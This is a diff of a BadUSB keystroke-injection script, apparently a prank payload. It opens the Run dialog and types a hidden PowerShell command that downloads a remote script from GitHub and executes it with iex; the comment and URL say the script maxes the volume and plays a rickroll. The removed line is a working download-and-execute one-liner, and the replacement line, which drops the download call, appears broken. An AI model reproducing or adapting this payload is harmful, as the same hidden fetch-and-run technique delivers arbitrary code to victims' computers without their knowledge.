@@ -1,5 +1,5 @@
 REM Set volume to 100% un-muted
 GUI r
 DELAY 500
-STRING powershell -w h irm 'https://raw.githubusercontent.com/SuperJakov/Badusb/main/volume-changer/volume-&-rickroll.ps1' | iex
+STRING powershell -w h 'https://raw.githubusercontent.com/SuperJakov/Badusb/main/volume-changer/volume-&-rickroll.ps1' | iex
 ENTER
